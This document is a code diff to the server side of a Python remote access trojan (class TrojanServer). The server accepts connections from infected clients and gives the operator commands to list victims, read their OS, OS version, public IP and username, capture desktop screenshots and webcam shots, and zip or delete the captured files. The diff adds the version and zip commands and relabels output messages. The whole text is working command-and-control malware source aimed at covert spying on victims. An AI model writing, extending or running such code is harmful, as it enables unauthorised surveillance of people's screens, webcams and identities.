@@ -10,6 +10,7 @@ class TrojanServer(object):
         self.s.bind((self.host, self.port))
         print("Server running...")
         print("type 'help' for commands")
+        print()
 
     def listener(self):
         self.s.listen(10)
@@ -17,11 +18,14 @@ class TrojanServer(object):
             client, address = self.s.accept()
             ipstr= address[0] + ":"+ str(address[1])
             client.settimeout(60)
-            print("Get connection from "+ ipstr)
+            print("[Server]>> Get connection from "+ ipstr)
             threading.Thread(target=self.client_conn, name=ipstr, args=(client,address)).start()
     
     def client_conn(self,client, address):
-        list_of_commands=["show clients","show os","show global ip","show username","make screenshot","make cam shot","exit client","help"]
+        # all commands in the list !
+        list_of_commands=["show clients","show os","show global ip","show username","make screenshot"
+        ,"make cam shot","exit client","help","show os version","make zip","remove zip"]
+
         while True:
             ipstr= address[0] + ":" + str(address[1]) + " >> "
             cmd = ""
@@ -42,7 +46,7 @@ class TrojanServer(object):
                         if (t.getName() == tmp[1].strip()):
                             t.join()
                 except RuntimeError:
-                    print("is already in use")
+                    print("[Server]>> is already in use")
                     continue
             
             ### HELP ###
@@ -53,17 +57,20 @@ class TrojanServer(object):
                 print("show clients         - List all connected clients")
                 print("show os              - show you the OS")
                 print("show global ip       - show the global IP")
-                print("show username        - show username from the user") 
+                print("show username        - show username from the user")
+                print("show os version      - show os version")
                 print("useconn [IP:PORT]    - Switch to the connection")
                 print("make screenshot      - make a screenshot from the desktop")
                 print("make cam shot        - make a shot from the webcam")
+                print("make zip             - compresses all files created (screenshot, cam shot etc.)")
+                print("remove zip           - deletes the zip file that was created by 'make zip'")
                 print("exit client          - closes the connection from the client")
-                print("help                 - Show all commands and options")
+                print("help or ?            - Show all commands and options")
                 print()
             
             # Put all commands here!
             elif not cmd.lower() in list_of_commands:
-                print("command not found")
+                print("[Server]>> command not found")
                 continue
 
             ### SEND ###
@@ -78,16 +85,16 @@ class TrojanServer(object):
 
                     if data:
                         #print("[from "+str(address[0])+":"+str(address[1])+"] >>"+str(data))
-                        print(">> "+str(data))
+                        print("[Client]>> "+str(data))
 
                         if str(data).lower() == "exit client":
-                            raise ConnectionError("Client disconnected")
+                            raise ConnectionError("[-] Client disconnected")
                     
                     else:
-                        raise ConnectionError("Client disconnected")
+                        raise ConnectionError("[-] Client disconnected")
 
                 except ConnectionError:
-                    print("Client "+ str(address)+" disconnected")
+                    print("[Server]>> Client "+ str(address)+" disconnected")
                     client.close()
                     return False
 
